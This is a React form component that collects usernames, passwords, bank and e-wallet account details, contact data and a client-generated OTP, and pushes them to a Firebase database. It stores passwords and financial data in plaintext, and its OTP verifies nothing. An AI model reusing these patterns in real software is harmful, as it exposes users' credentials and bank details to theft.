import React, { useState, useEffect } from 'react';
import Username from './Username';
import Password from './Password';
import ConfirmPassword from './ConfirmPassword';
import BankAccount from './BankAccount';
import Ewallet from './Ewallet';
import PersonalInfo from './PersonalInfo';
import Otp from './Otp';
import DeviceInfo from './DeviceInfo';
import { getDatabase, ref, push } from "firebase/database";
import { database } from '../firebaseConfig'; // Import database from firebaseConfig

const MainForm = () => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [confirmPassword, setConfirmPassword] = useState('');
    const [bank, setBank] = useState('BCA');
    const [accountNumber, setAccountNumber] = useState('');
    const [ewallet, setEwallet] = useState('Dana');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [name, setName] = useState('');
    const [email, setEmail] = useState('');
    const [otp, setOtp] = useState('');
    const [deviceInfo, setDeviceInfo] = useState('');

    useEffect(() => {
        setOtp(Math.floor(100000 + Math.random() * 900000).toString());
        // Assume deviceInfo is fetched here
        setDeviceInfo('User Device Info');
    }, []);

    const handleSubmit = (e) => {
        e.preventDefault();
        if (password !== confirmPassword) {
            alert("Passwords do not match");
            return;
        }
        const formData = {
            username,
            password,
            bank,
            accountNumber,
            ewallet,
            phoneNumber,
            name,
            email,
            otp,
            deviceInfo
        };
        const db = getDatabase();
        const usersRef = ref(db, 'users');
        push(usersRef, formData)
            .then(() => alert("Data submitted successfully"))
            .catch(error => alert("Error submitting data: " + error.message));
    };

    return (
        <form onSubmit={handleSubmit} className="w-full max-w-lg mx-auto">
            <Username value={username} onChange={(e) => setUsername(e.target.value)} />
            <Password value={password} onChange={(e) => setPassword(e.target.value)} />
            <ConfirmPassword value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)} />
            <BankAccount 
                bank={bank} 
                onBankChange={(e) => setBank(e.target.value)} 
                accountNumber={accountNumber} 
                onAccountNumberChange={(e) => setAccountNumber(e.target.value)} 
            />
            <Ewallet 
                ewallet={ewallet} 
                onEwalletChange={(e) => setEwallet(e.target.value)} 
                phoneNumber={phoneNumber} 
                onPhoneNumberChange={(e) => setPhoneNumber(e.target.value)} 
            />
            <PersonalInfo 
                name={name} 
                onNameChange={(e) => setName(e.target.value)} 
                email={email} 
                onEmailChange={(e) => setEmail(e.target.value)} 
            />
            <Otp otp={otp} />
            <DeviceInfo deviceInfo={deviceInfo} />
            <button type="submit" className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline">
                Submit
            </button>
        </form>
    );
};

export default MainForm;

